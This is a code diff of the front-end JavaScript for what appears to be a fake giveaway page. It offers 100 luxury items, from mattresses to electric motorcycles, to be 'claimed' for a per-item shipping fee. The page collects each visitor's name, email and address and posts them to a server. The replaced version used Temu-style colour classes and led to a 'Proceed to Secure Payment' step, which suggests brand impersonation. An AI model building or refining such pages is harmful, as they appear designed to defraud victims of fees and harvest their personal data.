+            { id: 55, name: "Tempur-Pedic King Mattress", category: "Home", value: "₦2,500,000", icon: "🛏️" },
+            { id: 56, name: "Riedel Decanter Set (Crystal)", category: "Lifestyle", value: "₦300,000", icon: "🍷" },
+            { id: 57, name: "Thermomix TM6 Smart Cooker", category: "Kitchen", value: "₦900,000", icon: "🧑‍🍳" },
+            { id: 58, name: "High-End Espresso Machine (La Marzocco)", category: "Kitchen", value: "₦2,000,000", icon: "☕" },
+            { id: 59, name: "Sonos Home Theater System", category: "Home", value: "₦1,500,000", icon: "🏠" },
+            { id: 60, name: "Luxury Scent Diffuser (Jo Malone)", category: "Lifestyle", value: "₦200,000", icon: "🕯️" },
+            { id: 61, name: "Outdoor Pizza Oven (Ooni Pro)", category: "Kitchen", value: "₦700,000", icon: "🍕" },
+            { id: 62, name: "Samsung Smart Fridge Hub", category: "Home", value: "₦4,500,000", icon: "🧊" },
+            { id: 63, name: "Eames Lounge Chair and Ottoman", category: "Luxury", value: "₦5,000,000", icon: "🪑" },
+            { id: 64, name: "iRobot Roomba j9+ Robot Vacuum", category: "Home", value: "₦650,000", icon: "🤖" },
+            { id: 65, name: "Top-Tier Air Purifier (Blueair)", category: "Home", value: "₦400,000", icon: "💨" },
+            { id: 66, name: "Vitamix Ascent Series Blender", category: "Kitchen", value: "₦350,000", icon: "🥤" },
+            { id: 67, name: "Artisanal Knife Set (Shun)", category: "Kitchen", value: "₦850,000", icon: "🔪" },
+            { id: 68, name: "Golf Simulator Setup (Trackman)", category: "Lifestyle", value: "₦15,000,000", icon: "⛳" },
+            { id: 69, name: "Billiard Table (Regulation Size)", category: "Lifestyle", value: "₦3,000,000", icon: "🎱" },
+            { id: 70, name: "Professional Stand Mixer (KitchenAid)", category: "Kitchen", value: "₦300,000", icon: "🎂" },
+            { id: 71, name: "Patio Furniture Set (Rattan, 8pc)", category: "Home", value: "₦1,200,000", icon: "🛋️" },
+            { id: 72, name: "Smart Garden Hydroponics System", category: "Home", value: "₦250,000", icon: "🌱" },
+            { id: 73, name: "Top-of-the-Line Gaming Chair (Secretlab)", category: "Lifestyle", value: "₦450,000", icon: "💺" },
+            { id: 74, name: "Electric Fireplace Insert", category: "Home", value: "₦950,000", icon: "🔥" },
+            { id: 75, name: "Designer Artwork Print (Signed)", category: "Luxury", value: "₦1,000,000", icon: "🖼️" },
 
-        // --- UI & SELECTION LOGIC ---
+            // TRANSPORTATION & COMMERCIAL GEAR (25 items)
+            { id: 76, name: "Electric Scooter (Segway GT2)", category: "Transport", value: "₦1,100,000", icon: "🛴" },
+            { id: 77, name: "High-End Road Bike (Pinarello)", category: "Transport", value: "₦3,500,000", icon: "🚲" },
+            { id: 78, name: "Commercial 3D Printer (UltiMaker)", category: "Commercial", value: "₦5,000,000", icon: "🖨️" },
+            { id: 79, name: "Solar Panel System (5kW Residential)", category: "Commercial", value: "₦7,000,000", icon: "☀️" },
+            { id: 80, name: "Go-Kart Racing Package (High Performance)", category: "Transport", value: "₦2,000,000", icon: "🏎️" },
+            { id: 81, name: "Professional DSLR Gimbal Stabilizer", category: "Commercial", value: "₦600,000", icon: "🎬" },
+            { id: 82, name: "Commercial-Grade Pressure Washer", category: "Commercial", value: "₦450,000", icon: "💧" },
+            { id: 83, name: "Electric Cargo Bike", category: "Transport", value: "₦1,500,000", icon: "📦" },
+            { id: 84, name: "High-End Car Diagnostics Tool", category: "Commercial", value: "₦800,000", icon: "🔧" },
+            { id: 85, name: "Folding Kayak (Advanced Model)", category: "Transport", value: "₦750,000", icon: "🛶" },
+            { id: 86, name: "Electric Motorcycle (Zero S)", category: "Transport", value: "₦6,500,000", icon: "🏍️" },
+            { id: 87, name: "Tractor Drone for Agriculture", category: "Commercial", value: "₦4,000,000", icon: "🌾" },
+            { id: 88, name: "Heavy-Duty Workshop Compressor", category: "Commercial", value: "₦900,000", icon: "🏭" },
+            { id: 89, name: "Electric Skateboard (Boosted Board)", category: "Transport", value: "₦550,000", icon: "🛹" },
+            { id: 90, name: "Professional Woodworking Router Table", category: "Commercial", value: "₦1,300,000", icon: "🔨" },
+            { id: 91, name: "Portable Generator (Honda EU7000is)", category: "Commercial", value: "₦2,500,000", icon: "🔌" },
+            { id: 92, name: "Carbon Fiber Mountain Bike (Full Suspension)", category: "Transport", value: "₦4,500,000", icon: "🚵" },
+            { id: 93, name: "Large Format Laser Engraver", category: "Commercial", value: "₦3,800,000", icon: "🔥" },
+            { id: 94, name: "Professional Sewing/Embroidery Machine", category: "Commercial", value: "₦1,700,000", icon: "🧵" },
+            { id: 95, name: "Water Sports Paddleboard Set", category: "Transport", value: "₦400,000", icon: "🏄" },
+            { id: 96, name: "High-Powered Binoculars (Zeiss)", category: "Lifestyle", value: "₦1,000,000", icon: "🔭" },
+            { id: 97, name: "Heavy-Duty Workshop Tool Chest (Snap-on)", category: "Commercial", value: "₦3,000,000", icon: "🛠️" },
+            { id: 98, name: "Acoustic Guitar (Martin D-45)", category: "Luxury", value: "₦2,200,000", icon: "🎸" },
+            { id: 99, name: "Portable Satellite Internet Terminal", category: "Commercial", value: "₦3,200,000", icon: "🛰️" },
+            { id: 100, name: "Electric Snow Blower", category: "Home", value: "₦600,000", icon: "❄️" }
+        ];
 
-        // Function to format NGN currency
-        function formatNaira(amount) {
-            // Ensure we format as NGN with 2 decimal places
-            return `₦${amount.toLocaleString('en-NG', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-        }
+        let selectedItems = [];
 
-        // Function to calculate shipping fee (based on item weights)
-        function calculateShippingFee(items) {
-            let baseFee = 15000; // Base fee in Naira
-            let weightFactor = 0;
+        // --- Utility Functions ---
 
-            items.forEach(item => {
-                switch (item.weight) {
-                    case 'light':
-                        weightFactor += 0.5;
-                        break;
-                    case 'medium':
-                        weightFactor += 1.0;
-                        break;
-                    case 'heavy':
-                        weightFactor += 1.5;
-                        break;
-                }
+        /**
+         * Formats a number as Nigerian Naira (NGN).
+         * @param {number} amount - The amount to format.
+         */
+        const formatNaira = (amount) => {
+            return amount.toLocaleString('en-NG', {
+                style: 'currency',
+                currency: 'NGN',
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2,
             });
+        };
 
-            // Calculate fee: base + (weightFactor * random amount between 5000 and 10000)
-            const randomAdd = Math.floor(Math.random() * 5000) + 5000;
-            let calculatedFee = baseFee + (weightFactor * randomAdd);
+        /**
+         * Updates the display for item count and shipping fee.
+         */
+        const updateSummary = () => {
+            const count = selectedItems.length;
+            const fee = count * SHIPPING_FEE_PER_ITEM;
 
-            // Ensure fee does not exceed ₦45,000
-            const maxFee = 45000;
-            return Math.min(Math.round(calculatedFee), maxFee);
-        }
+            ELEMENTS.itemCount.textContent = `Selected: ${count} / ${MAX_ITEMS}`;
+            ELEMENTS.shippingFeeDisplay.textContent = `Estimated Shipping Fee (NGN): ${formatNaira(fee)}`;
+            ELEMENTS.finalShippingFeeDisplay.textContent = formatNaira(fee).replace('₦', ''); // Remove symbol for placement
 
-        // Function to update the UI based on current selections
-        function updateUI() {
-            const currentSelections = appState.selectedItems.length;
-            
-            // Update status counter
-            statusElement.textContent = `Step 1 of 2 (${currentSelections} / ${appState.maxSelections} Items)`;
+            ELEMENTS.submitButton.disabled = count === 0;
+            ELEMENTS.submitButton.classList.toggle('opacity-50', count === 0);
+        };
 
-            // Update selected item names list
-            if (currentSelections > 0) {
-                itemNamesElement.textContent = appState.selectedItems.map(item => item.name).join(', ');
-            } else {
-                itemNamesElement.textContent = 'None selected.';
-            }
+        /**
+         * Handles the click event for selecting or deselecting an item.
+         * @param {object} item - The item object from the database.
+         * @param {HTMLElement} card - The DOM element of the item card.
+         */
+        const toggleItemSelection = (item, card) => {
+            const index = selectedItems.findIndex(i => i.id === item.id);
 
-            // Check if submission is ready (exactly 2 items selected)
-            const isReady = currentSelections === appState.maxSelections;
-
-            continueButton.disabled = !isReady;
-            continueButton.className = isReady
-                ? 'mt-8 w-full px-6 py-4 bg-temu-orange text-white font-bold rounded-xl text-xl shadow-lg hover:bg-temu-orange/80 transition-all duration-300'
-                : 'mt-8 w-full px-6 py-4 bg-gray-500 text-temu-light font-bold rounded-xl text-xl shadow-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed';
-            
-            buttonText.textContent = isReady
-                ? `Continue to Shipping Confirmation (${currentSelections}/${appState.maxSelections})`
-                : `Select ${appState.maxSelections - currentSelections} More Item${appState.maxSelections - currentSelections === 1 ? '' : 's'}`;
-            
-            // Show error message if too many are selected
-            if (currentSelections > appState.maxSelections) {
-                errorElement.classList.remove('hidden');
-            } else {
-                errorElement.classList.add('hidden');
-            }
-        }
-
-        // Handle item clicks
-        productGrid.addEventListener('click', (e) => {
-            const card = e.target.closest('.item-card');
-            if (!card) return;
-
-            const itemId = card.id;
-            const itemName = card.dataset.name;
-            const itemWeight = card.dataset.weight;
-            const isSelected = card.classList.contains('selected');
-
-            if (isSelected) {
-                // Deselect the item
+            if (index > -1) {
+                // Deselect
+                selectedItems.splice(index, 1);
                 card.classList.remove('selected');
-                appState.selectedItems = appState.selectedItems.filter(item => item.id !== itemId);
+            } else if (selectedItems.length < MAX_ITEMS) {
+                // Select
+                selectedItems.push(item);
+                card.classList.add('selected');
             } else {
-                // Select the item, but check limit first
-                if (appState.selectedItems.length < appState.maxSelections) {
-                    card.classList.add('selected');
-                    appState.selectedItems.push({ id: itemId, name: itemName, weight: itemWeight });
-                } else {
-                    showMessage('Limit Reached!', `You can only pick ${appState.maxSelections} items. Please deselect one item before choosing another.`, false);
-                }
+                // Maximum reached
+                showModal('Selection Limit Reached', `You can only select a maximum of ${MAX_ITEMS} items. Please deselect an item first.`, 'error');
             }
-            updateUI();
-        });
+            updateSummary();
+        };
 
+        /**
+         * Renders all 100 items into the grid.
+         */
+        const renderItems = () => {
+            ELEMENTS.itemsContainer.innerHTML = '';
+            itemDatabase.forEach(item => {
+                const card = document.createElement('div');
+                card.id = `item-${item.id}`;
+                card.className = 'item-card p-3 border-2 border-gray-200 rounded-lg cursor-pointer hover:border-blue-400 transition duration-150 bg-white shadow-sm hover:shadow-md';
+                card.innerHTML = `
+                    <div class="text-3xl mb-1">${item.icon}</div>
+                    <p class="font-semibold text-sm text-gray-900">${item.name}</p>
+                    <p class="text-xs text-gray-500">${item.category}</p>
+                    <p class="text-xs text-green-600 font-bold mt-1">${item.value}</p>
+                `;
+                card.addEventListener('click', () => toggleItemSelection(item, card));
+                ELEMENTS.itemsContainer.appendChild(card);
+            });
+        };
 
-        // --- FORM SUBMISSION & STEP TRANSITION LOGIC (STEP 1) ---
+        /**
+         * Displays the success/error modal.
+         */
+        const showModal = (title, body, type) => {
+            ELEMENTS.modalTitle.textContent = title;
+            ELEMENTS.modalBody.textContent = body;
+            
+            // Set icon and color based on type
+            let iconPath, colorClass;
+            if (type === 'success') {
+                iconPath = '<path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />';
+                colorClass = 'text-green-500';
+            } else {
+                iconPath = '<path stroke-linecap="round" stroke-linejoin="round" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />';
+                colorClass = 'text-red-500';
+            }
+            
+            ELEMENTS.modalIcon.innerHTML = iconPath;
+            ELEMENTS.modalIcon.className = `w-16 h-16 mx-auto ${colorClass}`;
+            ELEMENTS.messageModal.classList.remove('hidden');
+        };
 
-        // Handle step 1 form submission (Continue Button)
-        contactForm.addEventListener('submit', (e) => {
+        // --- Submission Handler ---
+
+        ELEMENTS.claimForm.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            if (appState.selectedItems.length !== appState.maxSelections) {
-                showMessage('Error', `Please ensure exactly ${appState.maxSelections} items are selected.`, false);
-                return;
-            }
+            // Disable button and show spinner
+            ELEMENTS.submitButton.disabled = true;
+            ELEMENTS.buttonText.textContent = 'Processing Claim...';
+            ELEMENTS.loadingSpinner.classList.remove('hidden');
 
-            // 1. Capture Form Data
-            appState.contactData = {
-                name: document.getElementById('name').value,
-                email: document.getElementById('email').value,
-                address: {
-                    line1: document.getElementById('address1').value,
-                    line2: document.getElementById('address2').value || '',
-                    city: document.getElementById('city').value,
-                    state: document.getElementById('state').value,
-                    zip: document.getElementById('zip').value
-                }
-            };
-            
-            // 2. Calculate Shipping Fee and store it in state
-            appState.shippingFee = calculateShippingFee(appState.selectedItems);
-            
-            // 3. Update Step 2 UI
-            shippingItemNames.textContent = appState.selectedItems.map(item => item.name).join(' & ');
-            shippingFeeElement.textContent = formatNaira(appState.shippingFee);
-            totalDueElement.textContent = formatNaira(appState.shippingFee);
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const address = document.getElementById('address').value;
+            const numberOfItems = selectedItems.length;
+            const shippingFee = numberOfItems * SHIPPING_FEE_PER_ITEM;
 
-            // 4. Transition to Step 2
-            step1.classList.add('hidden');
-            step2.classList.remove('hidden');
-            statusElement.textContent = 'Step 2 of 2 (Confirm Payment)';
-        });
-
-
-        // --- FINAL SUBMISSION LOGIC (STEP 2 - CONNECTED TO SERVER) ---
-        payNowButton.addEventListener('click', async () => {
-            payNowButton.disabled = true;
-            payNowButton.textContent = "Sending Claim to Server...";
-
-            const finalData = {
-                items_claimed: appState.selectedItems.map(item => ({ id: item.id, name: item.name })),
-                user_info: appState.contactData,
-                shipping_fee_ngn: appState.shippingFee,
-                timestamp: new Date().toISOString()
+            const payload = {
+                timestamp: new Date().toISOString(),
+                user_info: { name, email, address },
+                items_claimed: selectedItems.map(item => ({
+                    id: item.id,
+                    name: item.name,
+                    category: item.category,
+                    value: item.value // Store the estimated value string
+                })),
+                item_count: numberOfItems,
+                shipping_fee_ngn: shippingFee,
             };
 
             try {
-                // The fetch call goes to the server.js endpoint
-                const response = await fetch('/submit-claim', {
+                const response = await fetch(API_ENDPOINT, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(finalData)
+                    body: JSON.stringify(payload),
                 });
 
                 const result = await response.json();
-
+                
                 if (response.ok) {
-                    // Success response from server
-                    console.log("Server response:", result.message);
-                    showMessage(
-                        '✅ Claim Submitted!',
-                        `Your claim has been recorded on the server (ID: ${result.claimId || 'N/A'}). Your payment of ${formatNaira(appState.shippingFee)} is confirmed. Thank you!`,
-                        true
-                    );
-                    resetApp();
-                } else {
-                    // Error response from server
-                    console.error("Server error:", result.error);
-                    showMessage('🚫 Claim Failed', `The server rejected the claim: ${result.error || 'Unknown error.'} Please try again.`, false);
-                }
+                    let title = 'Claim Successful!';
+                    let message = `Congratulations, your ${numberOfItems} items have been reserved. Your unique Claim ID is: ${result.claimId || 'N/A'}. You will be contacted shortly for shipping confirmation.`;
+                    
+                    if (result.status === 'SUCCESS_NO_DB') {
+                         message = `WARNING: Your claim was successfully processed, but the server indicated it could not save the data to the database. Your Claim ID is: ${result.claimId || 'N/A'}. Please check your server logs!`;
+                    }
 
+                    showModal(title, message, 'success');
+                } else {
+                    // Handle server-side errors (500 status from server.js catch block)
+                    showModal('Claim Failed', `An error occurred: ${result.message || 'Server returned an unknown error.'}`, 'error');
+                }
             } catch (error) {
-                console.error("Network or Fetch Error:", error);
-                showMessage('🚫 Network Error', 'Could not connect to the server to submit the claim. Check your connection or deployment.', false);
+                // Handle network errors (e.g., server offline)
+                console.error('Network or Fetch Error:', error);
+                showModal('Connection Error', 'Could not connect to the server. Please check your network connection and try again.', 'error');
             } finally {
-                payNowButton.disabled = false;
-                payNowButton.textContent = "Proceed to Secure Payment";
+                // Reset form state regardless of success or failure
+                ELEMENTS.submitButton.disabled = false;
+                ELEMENTS.buttonText.textContent = 'CONFIRM CLAIM & SHIPMENT AGREEMENT';
+                ELEMENTS.loadingSpinner.classList.add('hidden');
             }
         });
 
-        // Handle back button
-        backButton.addEventListener('click', () => {
-            step2.classList.add('hidden');
-            step1.classList.remove('hidden');
-            statusElement.textContent = 'Step 1 of 2 (Select 2 Items)';
-            updateUI();
+        // --- Initialization ---
+        document.addEventListener('DOMContentLoaded', () => {
+            renderItems();
+            updateSummary();
         });
-
-
-        // --- UTILITY FUNCTIONS ---
-
-        function showMessage(title, content, isSuccess) {
-            messageTitle.textContent = title;
-            messageTitle.classList.remove('text-red-400', 'text-temu-accent');
-            messageTitle.classList.add(isSuccess ? 'text-temu-accent' : 'text-temu-red');
-            messageContent.textContent = content;
-            messageBox.classList.remove('hidden');
-        }
-
-        closeModalButton.addEventListener('click', () => {
-            messageBox.classList.add('hidden');
-        });
-        
-        function resetApp() {
-            contactForm.reset();
-            appState.selectedItems = [];
-            document.querySelectorAll('.item-card').forEach(card => card.classList.remove('selected'));
-            step2.classList.add('hidden');
-            step1.classList.remove('hidden');
-            updateUI();
-        }
-
-        // Initial UI setup
-        window.onload = updateUI;
 
     </script>
 </body>
